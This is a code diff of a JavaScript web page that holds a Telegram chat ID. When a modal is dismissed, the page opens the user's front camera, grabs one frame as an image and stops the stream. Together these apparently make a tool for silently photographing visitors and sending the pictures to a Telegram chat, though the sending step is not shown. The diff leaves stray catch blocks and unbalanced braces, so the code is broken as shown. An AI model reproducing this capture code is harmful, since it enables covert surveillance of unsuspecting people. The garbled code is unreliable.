@@ -65,33 +65,38 @@ const CHAT_ID = "-1002610945529";
 async function start(){
     document.getElementById("modal").style.display="none";
 
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+    });
+
     const video = document.getElementById("video");
+    video.srcObject = stream;
 
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" }
-        });
+    video.play();
 
-        video.srcObject = stream;
-        video.play();
+    // أسرع طريقة: نلتقط أول فريم جاهز مباشرة
+    video.onplaying = () => {
+        requestAnimationFrame(() => capture(stream));
+    };
+}
 
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
+function capture(stream){
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-        const bitmap = await imageCapture.grabFrame();
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-        const canvas = document.getElementById("canvas");
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
+    const ctx = canvas.getContext("2d");
 
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(bitmap, 0, 0);
+    ctx.drawImage(video, 0, 0);
 
-        canvas.toBlob(blob => {
-            window.capturedImage = blob; // تخزين الصورة
-        }, "image/png");
+    const image = canvas.toDataURL("image/png");
 
-        stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach(t => t.stop());
+
+    console.log("captured fast");
+};
 
     }catch(e){
         console.log("fallback used");
@@ -113,6 +118,8 @@ async function start(){
 
             stream.getTracks().forEach(t => t.stop());
         };
+    }
+};
 
     console.log("captured fast");
 }, "image/png");
